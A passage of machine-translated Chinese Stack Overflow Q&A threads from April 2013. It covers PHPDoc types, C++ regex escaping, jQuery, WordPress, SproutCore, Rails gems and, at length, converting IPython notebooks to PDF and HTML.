04-14 10:35:33.478: E/AndroidRuntime(278):  at java.lang.reflect.Method.invokeNative(Native Method)
04-14 10:35:33.478: E/AndroidRuntime(278):  at java.lang.reflect.Method.invoke(Method.java:521)
04-14 10:35:33.478: E/AndroidRuntime(278):  at com.android.internal.os.ZygoteInit$MethodAndArgsCaller.run(ZygoteInit.java:868)
04-14 10:35:33.478: E/AndroidRuntime(278):  at com.android.internal.os.ZygoteInit.main(ZygoteInit.java:626)
04-14 10:35:33.478: E/AndroidRuntime(278):  at dalvik.system.NativeStart.main(Native Method) 
```

有人能帮助我吗！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-14T11:22:15.430

您是否使用断点检查过哪些变量为空？此代码中的第 53 行在哪里？

您在哪里实例化您在函数 getInfo 中使用的变量“文本”？你确定这个变量不为空吗？

# php - PHPDoc 的 @param 注释的有效值是什么？

> ID：15998473
> 
> 赞同：8
> 
> 时间：2013-04-14T11:17:27.273
> 
> 标签：php, phpdoc

我在 PHPdocs 上[阅读](http://manual.phpdoc.org/HTMLSmartyConverter/HandS/phpDocumentor/tutorial_tags.param.pkg.html)：

> 数据类型应该是有效的 PHP 类型（int、string、bool 等）”，这很好，但他们没有说明使用哪些字符串（例如 int、string、bool）来标识其他类型。

我猜他们使用 (cast) 语法来确定要用于注释的类型，但是 PHP 中的浮点之类的东西没有强制转换运算符，所以我不确定该使用什么。可能是浮点数，也可能是 fp。

有没有人有 PHP 中基本类型的明确列表以及应该在 PHPdocs 中使用什么字符串来识别它们？

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2013-04-14T11:23:34.830

这一切都在文档中列出：http: [//phpdoc.org/docs/latest/references/phpdoc/types.html](https://web.archive.org/web/20190510183413/http://docs.phpdoc.org/references/phpdoc/types.html)（原始链接已失效；现在链接到 Internet 存档副本）

对于浮点数，关键字是 (逻辑上足够) `float`。

* * *

> 可识别以下关键字：
> 
> **string**，此类型适用的元素是二进制字符串。
> 
> **integer**或**int**，此类型适用的元素是整数或整数。
> 
> **boolean**或**bool**，此类型适用的元素仅具有状态 true 或 false。
> 
> **float**或**double**，此类型适用的元素是连续的或实数。
> 
> **object**，此类型适用的元素是未确定类的实例。
> 
> **混合**，此类型适用的元素可以是此处指定的任何类型。在编译时不知道将使用哪种类型。
> 
> **array**，此类型适用的元素是一个值数组，有关更多详细信息，请参阅数组部分。
> 
> **resource**，此类型适用的元素是根据 [http://www.php.net/manual/en/language.types.resource.php](http://www.php.net/manual/en/language.types.resource.php)的 PHP 定义的资源。
> 
> **void**，这种类型通常只在定义方法或函数的返回类型时使用。基本定义是使用此类型指示的元素不包含值，用户不应依赖任何检索到的值。
> 
> **null**，此类型适用的元素是 NULL 值，或者从技术角度来说，不存在。
> 
> 与 void 相比，一个很大的不同是这种类型用于所描述的元素可能在任何给定时间包含显式 NULL 值的任何情况。
> 
> **callable**，此类型适用的元素是指向函数调用的指针。这可以是 PHP 手册中定义的任何类型的回调 ~~`http://php.net/manual/en/language.pseudo-types.php`~~（死链接）。
> 
> **false**或**true**，应用此类型的元素将具有值 true 或 false。此元素不会返回任何其他值。
> 
> 此类型通常与另一种类型结合使用，以指示可能返回 true 或 false 而不是其他类型的实例。
> 
> **self**，此类型适用的元素与最初包含的文档元素属于同一类或其任何子项。

^([通过 Internet 存档的 phpDoc](https://web.archive.org/web/20190510183413/http://docs.phpdoc.org/references/phpdoc/types.html))

# ruby-on-rails - Rails Devise：检测FB / Linkedin /本地用户的登录方法

> ID：15998478
> 
> 赞同：1
> 
> 时间：2013-04-14T11:17:56.463
> 
> 标签：ruby-on-rails, devise, omniauth

我将 Devise 与 Omniauth gem 一起用于 Facebook 和 Linkedin 登录。我的应用程序允许用户使用 FB / Linkedin 和本地凭据登录。有什么好的方法可以检测当前用户如何登录系统吗？

到目前为止，我想到的最好的事情是从适当的 OmniauthCallbacksController 方法中将标志保存到用户模型中，该方法在用户登录时调用。不过，这不包括本地登录。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-09-02T23:31:46.520

如果将列 :providers 作为字符串添加到用户模型，它应该存储当前用户登录方法。将 user.provider = auth['provider'] 添加到用户模型中的定义中，你应该很好。

此参考可能有助于澄清：[http ://blog.yangtheman.com/2012/02/09/facebook-connect-with-rails-omniauth-devise/](http://blog.yangtheman.com/2012/02/09/facebook-connect-with-rails-omniauth-devise/)

祝你好运 ：）

# jquery - 当我写逗号时微调器返回默认数字

> ID：15998480
> 
> 赞同：0
> 
> 时间：2013-04-14T11:18:08.620
> 
> 标签：jquery, jquery-plugins, spinner

问题是，因为我在我的微调器中写了逗号然后我旋转，值自动返回到默认（最小或最大）数字，是否有任何解决方案可以使它像这样：当用户写逗号时，微调器会自动转换它指向并正常旋转到下一个值。

```
var spinner = $( "#spinner" ).spinner({
    step: 0.25,
    min: -12,
    max: 8
}); 
```

在这里你可以检查它：http: [//jsfiddle.net/XseWc/246/](http://jsfiddle.net/XseWc/246/) 我希望我足够清楚。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-14T11:34:12.923

如果我对您的问题的理解是正确的，那么您可以使用 jquery ui spinner [change event](http://api.jqueryui.com/spinner/#event-change)。

*注意*：这里我只处理了一个逗号大小写，现在你明白了，你可以根据需要修改它。

```
var spinner = $( "#spinner" ).spinner({
    step: 0.25,
    min: -12,
    max: 8,
    change: function( event, ui ) {
      var value = $(event.target).val();
      value = value.replace(/,/,'.');
      $(event.target).val(value);
    }
}); 
```

[演示小提琴](http://jsfiddle.net/XseWc/247/)

# c++ - 正则表达式 \w 在 C++11 中转义

> ID：15998482
> 
> 赞同：2
> 
> 时间：2013-04-14T11:18:21.287
> 
> 标签：c++, regex, c++11

此代码没有返回任何内容，我是否以错误的方式转义 w 字符？

[http://liveworkspace.org/code/3bRWOJ](http://liveworkspace.org/code/3bRWOJ) 38 美元

```
#include <iostream>
#include <regex>
using namespace std;

int main()
{
    const char *reg_esp = "\w";  // List of separator characters.

// this can be done using raw string literals:
// const char *reg_esp = R"([ ,.\t\n;:])";

std::regex rgx(reg_esp); // 'regex' is an instance of the template class
                         // 'basic_regex' with argument of type 'char'.
std::cmatch match; // 'cmatch' is an instance of the template class
                   // 'match_results' with argument of type 'const char *'.
const char *target = "Unseen University - Ankh-Morpork";

// Identifies all words of 'target' separated by characters of 'reg_esp'.
if (std::regex_search(target, match, rgx)) {
    // If words separated by specified characters are present.

    const size_t n = match.size();
    for (size_t a = 0; a < n; a++) {
        std::string str (match[a].first, match[a].second);
        std::cout << str << "\n";
    }
}

    return 0;
} 
```

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2013-04-14T11:22:49.713

正则表达式应包含`\w`，由两个字符`\`和组成`w`，因此您的 C++ 源代码应包含`"\\w"`您需要转义反斜杠的内容。

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2013-04-14T12:09:12.737

正如@DanielFrey 所说，对于普通的字符串文字，您必须将反斜杠加倍。使用 C++11，您可以改用原始字符串文字：`R"(\w)"`. 'R' 关闭特殊字符的处理，所以反斜杠只是一个反斜杠。括号标记原始字符串文字的开头和结尾，而不是文本的一部分。

# javascript - D3 Pack 布局 - 将事件附加到子元素

> ID：15998487
> 
> 赞同：1
> 
> 时间：2013-04-14T11:18:39.823
> 
> 标签：javascript, d3.js, circle-pack

我正在使用 D3 Circle 包布局，想知道是否可以将事件附加到子元素？

我使用此代码附加事件：

```
svg.selectAll("circle.child")
   .on("click", ChildClick, true);

function ChildClick(d, i) {      
    return true; 
  } 
```

但是该事件没有触发，我已经使用 FireBug 对其进行了调试，并且它没有进入事件函数。我也不能做简单的悬停事件。我可以将事件附加到所有父元素。

* * *

我已经部分解决了。这是由 css 引起的：

```
circle.child {
    pointer-events: none;
} 
```

如果我删除它，它也会为子元素触发事件，但缩放看起来不太好。现在必须努力解决这个问题..

# wordpress - WP_Query 帖子分页

> ID：15998488
> 
> 赞同：0
> 
> 时间：2013-04-14T11:19:13.983
> 
> 标签：wordpress

伙计们！我正在尝试在每页 5 个帖子中对帖子进行分页。但我正在使用 WP_Query。你能指出我可以得到信息来完成它的地方吗？谢谢。

```
 <?php $preNewsPosts = new WP_Query();
    $preNewsPosts->query('category_name=news&posts_per_page=30');
    while($preNewsPosts->have_posts()): $preNewsPosts->the_post();
    ?>
    <a href="<?php the_permalink(); ?>" ><?php the_post_thumbnail( 'thumbnail' ); ?></a>
    <hr style="width: 95%; border: 1px solid #e6e6e6; " />
    <?php
    endwhile;
    ?> 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-14T11:28:23.567

这是[一篇](http://tclayson.com/2012/03/28/custom-wp_query-and-loop-with-pagination-without-plugins/)详细解释如何使用自定义 WP_Query 完成分页的文章。

基本上你修改你的代码，使它看起来像这样：

```
<?php 
    $paged = (get_query_var('paged')) ? get_query_var('paged') : 1;
    $preNewsPosts = new WP_Query();
    $preNewsPosts->query('category_name=news&posts_per_page=30&paged=' . $paged);
    while($preNewsPosts->have_posts()): $preNewsPosts->the_post();
    ?>
      <a href="<?php the_permalink(); ?>" ><?php the_post_thumbnail( 'thumbnail' ); ?></a>
      <hr style="width: 95%; border: 1px solid #e6e6e6; " />
    <?php
    endwhile;
    ?>

<div class="navigation">
    <div class="next-posts"><?php next_posts_link('&laquo; Older Entries', $preNewsPosts->max_num_pages) ?></div>
    <div class="prev-posts"><?php previous_posts_link('Newer Entries &raquo;', $preNewsPosts->max_num_pages) ?></div>
</div> 
```

# javascript - 设置一个只包含一个对象的 SC.DataSource

> ID：15998490
> 
> 赞同：0
> 
> 时间：2013-04-14T11:19:15.720
> 
> 标签：javascript, datasource, sproutcore

我已将完整的源代码放在[https://github.com/ericgorr/myproject.git](https://github.com/ericgorr/myproject.git)和 cascading_datasource 应用程序中。

我有一个带有以下代码的 item_model.js：

```
CascadingDatasource.Item = SC.Record.extend(
{
      name:     SC.Record.attr(String),
      ph:       SC.Record.attr(String)
});

CascadingDatasource.Item.itemQuery = SC.Query.remote( CascadingDatasource.Item, { targetDataSource: 'itemDataSource' }); 
```

我的 data_source.js 是：

```
sc_require('data_sources/itemDataSource');

CascadingDatasource.dataSource = SC.CascadeDataSource.create(
{
      dataSources: ['itemDataSource'],

      itemDataSource: CascadingDatasource.itemDataSource,

}); 
```

我的 itemController.js 是：

```
CascadingDatasource.itemController = SC.ObjectController.create({
}); 
```

我的 itemDataSource.js 是：

```
sc_require( 'models/item_model' );

CascadingDatasource.itemDataSource = SC.DataSource.create(
{
    fetch: function( store, query ) 
    {
        var handled     = false,
            itemRecord;

        if ( query.recordType === CascadingDatasource.Item && query.targetDataSource === 'itemDataSource') 
        {       
            CascadingDatasource.store.loadRecord( CascadingDatasource.Item, {
                name:   'the name',
                ph:     'the phone number'
            }); 

            var theRecords = CascadingDatasource.store.recordsFor( CascadingDatasource.Item );

            // Indicate that we took this request.
            handled = true;
        }

        return handled;
    }
}); 
```

正是在这里，我错过了一个关键部分。我希望这个数据源只包含一个对象，但我不知道如何返回它的内容

我的 ready_state.js 是：

```
CascadingDatasource.ReadyState = SC.State.extend({ 

    enterState: function() 
    {
        CascadingDatasource.itemController.set( 'content', CascadingDatasource.store.find( CascadingDatasource.Item.itemQuery ) );

        CascadingDatasource.getPath('mainPage.mainPane').append();        
    },

    exitState: function() 
    {
        CascadingDatasource.getPath('mainPage.mainPane').remove();
    }

}); 
```

我有一个 SC.LabelView 具有以下内容：

```
valueBinding:   SC.Binding.oneWay( 'CascadingDatasource.itemController.name' ) 
```

同样，问题似乎在于：

```
CascadingDatasource.store.find( CascadingDatasource.Item.itemQuery ) 
```

没有返回任何内容，我不知道为什么。

如果一切正常，主页上的 SC.LabelView 应该绑定到 CascadingDatasource.itemController 中保存的结果的“名称”和“ph”属性。但是，目前，主页是空白的。

我目前在 Chrome 控制台中没有看到任何错误。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-16T13:06:36.540

好的，所以在克隆您的项目之后，我能够找到真正的问题。

根据[fetch](http://docs.sproutcore.com/#doc=SC.DataSource&method=fetch&src=false)上的文档，您必须在 store 上调用[loadQueryResults](http://docs.sproutcore.com/#doc=SC.Store&method=loadQueryResults&src=false)以便它知道正确更新所有内容。将您的代码更改为以下内容，它适用于我：

```
var storeKey = CascadingDatasource.store.loadRecord( CascadingDatasource.Item, {
  name:   'the name',
  ph:     'the phone number'
});

store.loadQueryResults(query, [storeKey]); 
```

如果这不起作用，我也可以向您发送带有适当修复的拉取请求，但是我的文本编辑器对实际文件做了各种有趣的事情，因为我使用空格而不是制表符:-P

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-15T14:59:00.360

根据[文档](http://docs.sproutcore.com/#doc=SC.Store&method=find&src=false)，`Store.find()`与查询一起使用时将返回[SC.RecordArray](http://docs.sproutcore.com/#doc=SC.RecordArray&src=false)，而不是模型对象。

我建议将返回值设置为`store.find(...)`SC.ArrayController [，](http://docs.sproutcore.com/#doc=SC.ArrayController&src=false)然后将单独的[SC.ObjectController](http://docs.sproutcore.com/#doc=SC.ObjectController&src=false)绑定到该`.firstObject`属性的属性，如下所示：

```
CascadingDatasource.arrayController = SC.ArrayController.create({
});

CascadingDatasource.itemController = SC.ObjectController.create({
  contentBinding: SC.Binding.oneWay('CascadingDatasource.arrayController.firstObject')
});

CascadingDatasource.ReadyState = SC.State.extend({
  enterState: function() {
    CascadingDatasource.arrayController.set('content', CascadingDatasource.store.find(CascadingDatasource.Item.itemQuery));

    CascadingDatasource.getPath('mainPage.mainPane').append();
  },

  exitState: function() {
    CascadingDatasource.getPath('mainPage.mainPane').remove();
  }
}); 
```

这应该确保标签视图获得一个要渲染的对象。

# python - 如何将 IPython 笔记本转换为 PDF 和 HTML？

> ID：15998491
> 
> 赞同：118
> 
> 时间：2013-04-14T11:19:17.790
> 
> 标签：python, jupyter-notebook, ipython

我想将我的 ipython-notebooks 转换为打印它们，或者只是以 html 格式发送它们。我注意到已经有一个工具可以做到这一点，[nbconvert](https://github.com/ipython/nbconvert)。虽然我已经下载了它，但我不知道如何使用 nbconvert2.py 转换笔记本，因为 nbconvert 说它已被弃用。nbconvert2.py 说我需要一个配置文件来转换笔记本，它是什么？是否存在有关此工具的文档？

* * *

## 回答 #1

> 赞同：128
> 
> 时间：2014-09-19T20:42:41.310

如果您安装了 LaTeX，您可以使用*File* -> *Download as* -> *PDF via LaTeX (.pdf)*直接从 Jupyter notebook 下载 PDF 格式。否则按照这两个步骤。

1.  对于 HTML 输出，您现在应该使用 Jupyter 代替 IPython 并选择*File* -> *Download as* -> *HTML (.html)*或运行以下命令：

    ```
     jupyter nbconvert --to html notebook.ipynb 
    ```

    这会将 Jupyter 文档文件 notebook.ipynb 转换为 html 输出格式。

    Google Colaboratory 是 Google 的免费 Jupyter 笔记本环境，无需设置，完全在云中运行。如果您使用的是 Google Colab，命令是相同的，但 Google Colab 只允许您下载 .ipynb 或 .py 格式。

2.  将 html 文件 notebook.html 转换为名为 notebook.pdf 的 pdf 文件。在 Windows、macOS ( `brew install wkhtmltodf`) 或 Linux 中，安装[wkhtmltopdf](https://wkhtmltopdf.org/downloads.html)。wkhtmltopdf 是一个命令行实用程序，用于使用 WebKit 将 html 转换为 pdf。您可以从链接的网页下载 wkhtmltopdf，或者在许多 Linux 发行版中可以在其存储库中找到它。

    ```
     wkhtmltopdf notebook.html notebook.pdf 
    ```

* * *

[原始（现在几乎已过时）修订：将 IPython 笔记本文件转换为 html。]

^(`ipython nbconvert --to html notebook.ipynb`)

* * *

## 回答 #2

> 赞同：24
> 
> 时间：2017-12-12T12:58:30.303

**还传递`--execute`标志以生成输出单元格**

```
jupyter nbconvert --execute --to html notebook.ipynb
jupyter nbconvert --execute --to pdf notebook.ipynb 
```

最佳做法是将输出保留在笔记本之外以进行版本控制，请参阅：[在版本控制下使用 IPython 笔记本](https://stackoverflow.com/questions/18734739/using-ipython-notebooks-under-version-control)

但是，如果您不通过`--execute`，输出将不会出现在 HTML 中，另请参阅：[如何从终端运行 .ipynb Jupyter Notebook？](https://stackoverflow.com/questions/35545402/running-ipynb-from-terminal)

对于没有标题的 HTML 片段：[How to export an IPython notebook to HTML for a blog post？](https://stackoverflow.com/questions/12502187/ipython-notebook-to-html-for-blog-post)

在 Jupyter 4.4.0 中测试。

* * *

## 回答 #3

> 赞同：20
> 
> 时间：2013-04-14T11:30:23.793

从[文档](http://ipython.org/ipython-doc/stable/interactive/htmlnotebook.html#exporting-a-notebook-and-importing-existing-scripts)：

> 如果您想向其他人提供您笔记本的静态 HTML 或 PDF 视图，请使用“打印”按钮。这将打开文档的静态视图，您可以使用操作系统的工具将其打印为 PDF，或者使用 Web 浏览器的“保存”选项保存到文件（请注意，通常这将创建一个 html 文件和一个名为notebook_name_files 旁边包含所有必要的样式信息，因此如果您打算共享它，则必须将目录与主 html 文件一起发送）。

* * *

## 回答 #4

> 赞同：14
> 
> 时间：2013-04-14T12:31:13.567

nbconvert 尚未完全被 nbconvert2 取代，如果您愿意，您仍然可以使用它，否则我们会删除该可执行文件。这只是一个警告，我们不再修复 nbconvert1。

以下应该有效：

```
./nbconvert.py --format=pdf yourfile.ipynb 
```

如果您使用的是最新版本的 IPython，请不要使用打印视图，只需使用正常的打印对话框即可。在 chrome 中剪切图形是一个已知问题（Chrome 不尊重某些打印 css），并且在 firefox 上效果更好，并非所有版本仍然如此。

至于 nbconvert2，它仍然是高度开发的，需要编写文档。

[Nbviewer](http://nbviewer.ipython.org/)使用 nbconvert2 所以它与 HTML 相当不错。

当前可用配置文件列表：

```
$ ls -l1 profile|cut -d. -f1

base_html
blogger_html
full_html
latex_base
latex_sphinx_base
latex_sphinx_howto
latex_sphinx_manual
markdown
python
reveal
rst 
```

给你现有的配置文件。（您可以创建自己的，参考未来的文档，`./nbconvert2.py --help-all`应该会给您一些可以在您的个人资料中使用的选项。）

然后

```
$ ./nbconvert2.py [profilename] --no-stdout --write=True <yourfile.ipynb> 
```

只要在cwd中提取数字，它就应该写你的（tex）文件。是的，我知道这并不明显，它可能会改变，因此没有文档......

原因是 nbconvert2 将主要是一个 python**库**，您可以在伪代码中执行以下操作：

```
 MyConverter = NBConverter(config=config)
 ipynb = read(ipynb_file)
 converted_files = MyConverter.convert(ipynb)
 for file in converted_files :
     write(file) 
```

一旦 API 稳定下来，入口点就会出现。

我只想指出[@jdfreder（github 个人资料）](https://github.com/jdfreder)正在处理 tex/pdf/sphinx 导出，并且在撰写本文时是从 ipynb 文件生成 PDF 的专家。

* * *

## 回答 #5

> 赞同：10
> 
> 时间：2018-12-12T18:10:39.440

1.  另存为**HTML** ;
2.  `Ctrl`+ `P`;
3.  另存为**PDF**。

* * *

## 回答 #6

> 赞同：9
> 
> 时间：2020-02-11T15:13:16.777

对于那些无法在他们的系统中安装[wkhtmltopdf](https://wkhtmltopdf.org/downloads.html)的人，除了这个问题的答案中已经提到的许多方法之外，还有一种方法是简单地从 jupyter notebook 下载文件作为 html 文件，将其上传到[HTML to PDF](https://html2pdf.com)，然后下载从那里转换的pdf文件。

在这里，您将 IPython notebook(.ipynb) 转换为 PDF(.pdf) 和 HTML(.html) 格式。

* * *

## 回答 #7

> 赞同：8
> 
> 时间：2019-10-06T10:40:30.780

> 如果您的文档中有数学、科学公式，那么只有这个答案对您有用。即使您没有它们，它也可以正常工作。

*   安装[LaTeX](https://www.latex-project.org/get/)
*   安装[nbconvert](https://nbconvert.readthedocs.io/en/latest/install.html)

**图形界面方式**

*   打开 jupyter 笔记本 [![打开 jupyter 笔记本](https://i.stack.imgur.com/NRoNo.png)](https://i.stack.imgur.com/NRoNo.png)

*   通过 LaTeX 转到文件 > 下载为 > HTML 或 PDF[![通过 LaTeX 转到文件 > 下载为 > HTML 或 PDF](https://i.stack.imgur.com/FJYmJ.png)](https://i.stack.imgur.com/FJYmJ.png)

*   然后检查您的下载文件夹中的文件。PS：如果 LaTeX 在编译 PDF 时出现任何错误，它将失败。如果发生这种情况，请下载 HTML 文件，然后使用[网页转 PDF 工具](http://webpagetopdf.com/)或任何其他类似服务将 HTML 转换为 PDF。

**命令行方式**

*   打开终端
*   导航到包含 jupyter 笔记本的文件夹
*   输入“jupyter nbconvert --to pdf your_jupyter_notebook.ipynb”

PS：如果失败，请尝试[Yogesh 的回答](https://stackoverflow.com/a/54918180/7952027)。

* * *

## 回答 #8

> 赞同：6
> 
> 时间：2016-12-23T07:29:42.113

如果您使用的是[sagemath](https://cloud.sagemath.com/)云版本，您只需转到左上角，
选择 File → Download as → Pdf via LaTeX (.pdf)
如果需要，请查看屏幕截图。

[![屏幕截图 将 ipynb 转换为 pdf](https://i.stack.imgur.com/RCaTT.png)](https://i.stack.imgur.com/RCaTT.png)

如果由于任何原因它不起作用，您可以尝试另一种方法。
选择文件→打印预览，然后在预览上
右键单击→打印，然后选择另存为pdf。

* * *

## 回答 #9

> 赞同：4
> 
> 时间：2019-02-28T03:57:39.720

您可以先将笔记本转换为 HTML，然后再转换为 PDF 格式：

以下我已经实施的步骤：操作系统：Ubuntu、Anaconda-Jupyter notebook、Python 3

# 1 以 HTML 格式保存笔记本：

1.  启动要以 HTML 格式保存的 jupyter notebook。首先正确保存笔记本，以便 HTML 文件具有您的代码/笔记本的最新保存版本。

2.  从笔记本本身运行以下命令：

    `!jupyter nbconvert --to html your_notebook_name.ipynb`

执行后将创建笔记本的 HTML 版本并将其保存在当前工作目录中。您将看到一个 html 文件将添加到当前目录，`your_notebook_name.html`名称为

( `your_notebook_name.ipynb`--> `your_notebook_name.html`)。

# 2 将 html 保存为 PDF：

1.  现在打开该`your_notebook_name.html`文件（单击它）。它将在浏览器的新选项卡中打开。
2.  现在转到打印选项。从这里您可以将此文件保存为 pdf 文件格式。

请注意，从打印选项中，我们还可以灵活地选择笔记本的一部分以保存为 pdf 格式。

* * *

## 回答 #10

> 赞同：3
> 
> 时间：2018-12-30T07:40:46.817

**其他建议的方法：**

1.  使用“打印然后选择另存为 pdf”。从您的 HTML 文件中删除将导致边界边缘**丢失**、语法突出显示、绘图修剪等。

2.  在使用过时的版本时，其他一些库已被证明是损坏的。

**解决方案：**更好、更轻松的选择是使用在线[转换器](https://www.sejda.com/html-to-pdf)，它将 *.ipynb 的 *.html 版本转换为 *.pdf。

**脚步：**

1.  首先，从您的 Jupyter 笔记本界面，使用以下命令将您的 *.ipynb 转换为 *.html：

> 文件 > 下载为 > HTML(.html)

2.  [在此处](https://www.sejda.com/html-to-pdf)上传新创建的 *.html 文件，然后选择 HTML 到 PDF 选项。

3.  您的 pdf 文件现在可以下载了。

4.  您现在拥有 .ipynb、.html 和 .pdf 文件

* * *

## 回答 #11

> 赞同：3
> 
> 时间：2018-04-05T01:28:22.510

我发现将网络上的笔记本转换为 pdf 的最简单方法是首先在网络服务[nbviewer](http://nbviewer.jupyter.org/)上查看它。然后，您可以将其打印为 pdf 文件。如果笔记本在您的本地驱动器上，则首先将其上传到 github 存储库并将其 url 用于 nbviewer。

* * *

## 回答 #12

> 赞同：2
> 
> 时间：2014-06-01T20:46:55.853

我还不能让 pdf 工作。[文档](http://ipython.org/ipython-doc/rel-1.0.0/interactive/nbconvert.html)暗示我应该能够让它与乳胶一起使用，所以也许我的乳胶不起作用。

```
$ ipython --version
1.1.0
$ ipython nbconvert --to latex  --post PDF myfile.ipynb
[NbConvertApp] ...
    raise child_exception
    OSError: [Errno 2] No such file or directory
$ ipython nbconvert --to pdf myfile.ipynb
  [NbConvertApp] CRITICAL | Bad config encountered during initialization:
  [NbConvertApp] CRITICAL | The 'export_format' trait of a NbConvertApp instance must be any of ['custom', 'html', 'latex', 'markdown', 'python', 'rst', 'slides'] or None, but a value of u'pdf' <type 'unicode'> was specified. 
```

然而，HTML 使用“幻灯片”效果很好，而且很漂亮！

```
$ ipython nbconvert --to slides myfile.ipynb
...
[NbConvertApp] Writing 215220 bytes to myfile.slides.html 
```

2014-11-07Fri. 更新：IPython v3 语法不同，它更简单：

```
$ ipython nbconvert --to PDF myfile.ipynb 
```

在所有情况下，我似乎都错过了“pdflatex”库。我正在调查那个。

* * *

## 回答 #13

> 赞同：2
> 
> 时间：2017-11-13T22:02:21.233

我一直在寻找一种将笔记本保存为 html 的方法，因为每当我尝试使用新安装的 Jupyter 下载为 html 时，我总是会收到`500 : Internal Server Error The error was: nbconvert failed: validate() got an unexpected keyword argument 'relax_add_props'`错误消息。奇怪的是，我发现下载为 html 很简单：

1.  左键单击笔记本
2.  点击下拉菜单中的“另存为...”
3.  相应地保存

没有打印预览，没有打印，没有 nbconvert。使用 Jupyter `Version: 1.0.0`。只是一个尝试的建议（显然并非所有设置都相同）。

* * *

## 回答 #14

> 赞同：2
> 
> 时间：2020-06-28T18:33:06.100

## **notebook-as-pdf安装**

python -m pip install notebook-as-pdf pyppeteer-install

## 用它

您也可以将它与 nbconvert 一起使用：

jupyter-nbconvert --to PDFviaHTML filename.ipynb

这将创建一个名为 filename.pdf 的文件。

或 pip install notebook-as-pdf

从笔记本 jupyter-nbconvert-toPDFviaHTML 创建 pdf

* * *

## 回答 #15

> 赞同：2
> 
> 时间：2019-05-07T23:28:06.463

我在 inline python 中结合了上面的一些答案，您可以将它们添加到 ~/.bashrc 或 ~/.zshrc 以编译并将许多笔记本转换为单个 pdf 文件

```
function convert_notebooks(){
  # read anything on this folder that ends on ipynb and run pdf formatting for it  
  python -c 'import os; [os.system("jupyter nbconvert --to pdf " + f) for f in os.listdir (".") if f.endswith("ipynb")]'
  # to convert to pdf u must have installed latex and that means u have pdfjam installed
  pdfjam * 
} 
```

* * *

## 回答 #16

> 赞同：2
> 
> 时间：2019-10-06T11:29:50.960

[partizanos answer](https://stackoverflow.com/a/56031655/7952027)的纯python版本。

*   打开终端（Linux、MacOS）或找到可以在 Windows 中执行 python 文件的位置
*   在 .py 文件中键入以下代码（例如 tejas.py）

```
import os

[os.system("jupyter nbconvert --to pdf " + f) for f in os.listdir(".") if f.endswith("ipynb")] 
```

*   导航到包含 jupyter 笔记本的文件夹
*   确保 tejas.py 在当前文件夹中。如有必要，将其复制到当前文件夹。
*   输入“python tejas.py”
*   任务完成

* * *

## 回答 #17

> 赞同：2
> 
> 时间：2021-09-15T01:03:15.213

**简单直接的方式只是**

1- 在 Jupiter notebook 中**单击 Ctrl + P**

2-**另存为PDF** [![在此处输入图像描述](https://i.stack.imgur.com/T3sj7.png)](https://i.stack.imgur.com/T3sj7.png)

* * *

## 回答 #18

> 赞同：1
> 
> 时间：2021-05-06T19:49:18.117

有一个名为“notebook as PDF”的[库](https://pypi.org/project/notebook-as-pdf/)`pip install notebook-as-pdf`。

它通过 HTML 将笔记本转换为 pdf。安装库后，您可以在“文件”选项卡的“下载为”选项中找到“PDF via HTML (.pdf)”。

文件>下载为>PDF通过HTML（.pdf）

[![在此处输入图像描述](https://i.stack.imgur.com/KZhQK.png)](https://i.stack.imgur.com/KZhQK.png)

使用 Ctrl+P

*   有时，当有许多单元格时，选项可能无法正常工作。

*   此外，分页也不正确。使读者更难阅读和理解。

与此处介绍的其他选项相比，我发现此方法非常直观、快速且更好。

* * *

## 回答 #19

> 赞同：0
> 
> 时间：2020-08-26T13:04:17.740

我认为最简单的方法是“Ctrl+P”>另存为“pdf”。而已。

# java - ObjectOutputStream(FileOutputStream) 指针修改

> ID：15998492
> 
> 赞同：0
> 
> 时间：2013-04-14T11:19:30.670
> 
> 标签：java, fileoutputstream, objectoutputstream

我不明白是否用流做标题中所说的，如果我使用对象流将对象写入文件，它是否会移动文件流的指针，当我使用它之后，写一些东西，它写在上述对象之后？输入流也一样

非常感谢

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-14T11:30:22.040

是的，当包装流（顺便说一下，称为装饰器模式）时，写入最外层流（实际上是一个外壳）将沿着链传播写入。

这里要注意的重要一点是，链上的各种 Stream 对象可能有自己的缓冲区，因此写入不会立即进入管道。缓冲输出流和 zip 输出流就是很好的例子。

如果您打算将某些内容写入包装流，然后将某些内容直接写入链中较深的流之一，建议您在最外层流上调用 flush() 以确保链中的任何缓冲区都将是冲出 - 否则您可能会乱写位。

# ruby-on-rails - Rails Admin gem 安装正确但缺少 admin 文件夹

> ID：15998493
> 
> 赞同：1
> 
> 时间：2013-04-14T11:19:30.737
> 
> 标签：ruby-on-rails, rails-admin

正如标题所解释的，我已经添加了**rails_admin gem**，但它缺少带有管理员配置的**app/admin文件夹。**但是该应用程序已集成并与 gem 正常工作：我在 gem 上添加了资源，并且在管理站点上已正确配置和显示。

我以前使用过 Rails Admin，但我没有遇到这样的问题。并且在您运行安装程序后根据他们的文档：`..as well as a new folder at app/admin to put all your admin configurations.`所以它应该马上就在那里。

有没有人遇到过类似的问题或者知道是什么问题？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-14T11:43:02.497

Rails Admin 安装为 rails 引擎，因此当您按照文档中的描述执行任务时，它将创建一些迁移（稍后您必须使用**rake db:migrate**运行）并将路由安装为引擎。

但是，[**activeadmin**](http://activeadmin.info/)是一个 gem，它允许您在管理员中进行更多自定义，并且实际上创建**应用程序/管理员**文件以自定义管理员上的每个模型。

更新您的 Gemfile，删除该行

```
gem 'rails_admin' 
```

并添加行

```
gem 'activeadmin' 
```

确保删除 railsadmin 创建的初始化文件，railsadmin 创建的迁移，以及 rails admin 引入到您的**config/routes.rb**的安装根目录，按照 activeadmin 上的文档进行操作，您应该能够看到和更新您正在寻找的管理文件:)

# c++ - win32 treeview 处理 treeview wndproc 中的展开或折叠事件，而不是它的父级

> ID：15998498
> 
> 赞同：0
> 
> 时间：2013-04-14T11:20:07.523
> 
> 标签：c++, winapi, treeview, expand, collapse

